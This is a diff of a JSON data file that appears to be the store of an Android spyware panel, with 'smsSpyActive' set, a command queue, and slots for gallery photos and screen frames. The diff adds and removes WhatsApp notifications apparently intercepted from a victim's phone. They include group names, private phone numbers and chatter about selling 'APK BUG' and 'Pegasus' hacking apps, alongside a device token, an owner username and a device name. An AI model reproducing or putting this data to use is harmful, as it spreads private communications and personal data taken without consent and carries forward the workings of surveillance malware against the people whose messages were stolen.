@@ -22,6 +22,30 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎7Sex Message (35 pesan): ~ Ubill",
+        "content": "Pm",
+        "time": "02/04 03:54",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775073253591
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (2 pesan): ~ Bimm.",
+        "content": "087898838081",
+        "time": "02/04 03:54",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775073253511
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "APK BUG BY ZYRXX: ~ sanzz",
+        "content": "🎥 Diskon 25k aja pm 083181647282 (0.36)",
+        "time": "02/04 03:54",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775073253487
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "WhatsApp",
         "content": "‎‎1622 pesan dari 14 chat",
         "time": "02/04 03:23",
@@ -3995,30 +4019,6 @@
         "time": "02/04 00:32",
         "pkg": "com.whatsapp",
         "receivedAt": 1775061150480
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (35 pesan): ~ Ubill",
-        "content": "Pm",
-        "time": "02/04 00:32",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775061149771
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝗚𝗕 𝗜𝗦𝗜𝗔𝗡 𝗕𝗬 𝗭𝗜𝗟 𝗫 𝗢𝗪𝗡 #𝟭 (19 pesan): ~ sllyvan",
-        "content": "npt no dongo",
-        "time": "02/04 00:32",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775061149737
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Pegasus-X Room (16 pesan): ~ raxz",
-        "content": "kirlang apk pegasus gua tak punya link download nya",
-        "time": "02/04 00:32",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775061149606
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "APK BUG BY ZYRXX: ~ sanzz",
+        "content": "🎥 Diskon 25k aja pm 083181647282 (0.36)",
+        "time": "02/04 03:54",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775073253532
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -8056,14 +8064,6 @@
         "time": "02/04 00:32",
         "pkg": "com.whatsapp",
         "receivedAt": 1775061149698
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Pegasus-X Room (16 pesan): ~ raxz",
-        "content": "kirlang apk pegasus gua tak punya link download nya",
-        "time": "02/04 00:32",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775061149552
       }
     ],
     "galleryPhotos": [],
@@ -8483,7 +8483,7 @@
     "deviceName": "HP-AHMADDDD1-4708",
     "ownerUsername": "Axmadz",
     "token": "520070cf4248976c6a5bc8d7767d78d8",
-    "lastSeen": 1775073239724,
+    "lastSeen": 1775073251735,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T17:49:10.524Z",
